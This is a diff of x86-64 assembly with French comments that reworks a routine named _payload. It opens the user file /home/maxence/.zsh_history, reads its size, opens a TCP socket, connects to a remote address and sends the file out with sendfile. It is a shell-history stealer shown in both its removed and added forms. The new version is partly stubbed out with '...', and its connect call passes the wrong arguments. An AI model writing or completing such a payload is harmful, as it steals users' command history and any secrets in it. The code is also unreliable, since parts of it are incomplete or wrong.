@@ -19,8 +19,6 @@ global _payload_size
 
 section .data
     path db '/home/maxence/.zsh_history', 0
-    addr_ip dd 0
-    port dw 0x0
     stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
     sockaddr_in:
         ; La structure sockaddr_in est composée de :
@@ -40,84 +38,84 @@ section .text
 global _payload
 
 _payload:
-    ; Sauvegarde des registres
-	pushx rbx, rbp, r12, r13, r14, r15
+    push rbp
+    mov rbp, rsp
 
     ; Ouvrir le fichier
-    mov rax, 2                    ; SYS_open
-    lea rdi, [rel path]           ; Chemin du fichier
-    mov rsi, 0                    ; O_RDONLY
+    mov rax, 2 ; SYS_open
+    lea rdi, [path]
+    mov rsi, 0 ; O_RDONLY
     syscall
     test rax, rax
-    js exit                       ; Si erreur, quitter
-    mov r12, rax                  ; Sauvegarder le descripteur de fichier dans r12
+    js error_open
 
-    ; Obtenir les informations du fichier
-    mov rax, 4                    ; SYS_stat
-    lea rdi, [rel path]           ; Chemin du fichier
-    lea rsi, [rel stat_buffer]    ; Buffer de stat
+    mov r12, rax ; Descripteur de fichier
+
+    ; Récupérer les métadonnées du fichier
+    mov rax, 4 ; SYS_stat
+    lea rdi, [path]
+    lea rsi, [stat_buffer]
     syscall
     test rax, rax
-    js close_file                 ; Si erreur, fermer le fichier et quitter
+    js error_stat
 
     ; Créer la socket
-    mov rax, 41                   ; SYS_socket
-    mov rdi, 2                    ; AF_INET
-    mov rsi, 1                    ; SOCK_STREAM
-    mov rdx, 0                    ; 0
+    mov rax, 41 ; SYS_socket
+    mov rdi, 2 ; AF_INET
+    mov rsi, 1 ; SOCK_STREAM
+    mov rdx, 0
     syscall
     test rax, rax
-    js close_file                 ; Si erreur, fermer le fichier et quitter
-    mov r13, rax                  ; Sauvegarder le descripteur de socket dans r13
+    js error_socket
 
-    ; Préparer la structure sockaddr_in
-    lea rdi, [rel sockaddr_in]
-    mov rax, 42                   ; SYS_connect
-    mov rsi, r13                  ; Socket
-    mov rdx, 16                   ; Taille de sockaddr_in
+    mov r13, rax ; Descripteur de socket
+
+    ; Connecter au serveur
+    mov rax, 42 ; SYS_connect
+    lea rdi, [sockaddr_in]
+    mov rsi, r13
+    mov rdx, 16 ; Taille de sockaddr_in
     syscall
     test rax, rax
-    js error               ; Si erreur, fermer la socket et le fichier, et quitter
+    js error_connect
 
-    ; Envoyer le fichier via la socket
-    mov rax, 40                   ; SYS_sendfile
-    mov rdi, r13                  ; Socket
-    mov rsi, r12                  ; Descripteur de fichier
-    xor rdx, rdx                  ; Offset (0)
-    mov r10, [rel stat_buffer + 48] ; Taille du fichier
+    ; Envoyer le fichier (simplification, voir plus bas)
+    mov rax, 40 ; SYS_sendfile
+    ; ...
+
+    ; Fermer le fichier et la socket
+    mov rax, 3 ; SYS_close
+    mov rdi, r12
     syscall
-    test rax, rax
-    js error               ; Si erreur, fermer la socket et le fichier, et quitter
-
-    ; Fin propre
-    jmp cleanup
-
-error:
-	; Gestion des erreurs
-	mov rdi, rax			; Code de sortie 1
-	mov rax, 60				; SYS_exit
-	syscall
-
-close_socket:
-    ; Fermer la socket
-    mov rax, 3                    ; SYS_close
-    mov rdi, r13                  ; Descripteur de socket
+    mov rax, 3 ; SYS_close
+    mov rdi, r13
     syscall
 
-close_file:
-    ; Fermer le fichier
-    mov rax, 3                    ; SYS_close
-    mov rdi, r12                  ; Descripteur de fichier
-    syscall
+    leave
+    ret
 
-cleanup:
-    ; Restaurer les registres
-	popx rbx, rbp, r12, r13, r14, r15
+error_open:
+    ; Gestion de l'erreur
+    ; ...
+    jmp exit
+
+error_stat:
+    ; Gestion de l'erreur
+    ; ...
+    jmp exit
+
+error_socket:
+    ; Gestion de l'erreur
+    ; ...
+    jmp exit
+
+error_connect:
+    ; Gestion de l'erreur
+    ; ...
+    jmp exit
 
 exit:
     ; Quitter le programme
-    ; mov rax, 60                   ; SYS_exit
-    ; xor rdi, rdi                  ; Code de sortie 0
-    ; syscall
-	mov rax, 0
-	ret
+    mov rax, 60
+    xor rdi, rdi
+    syscall
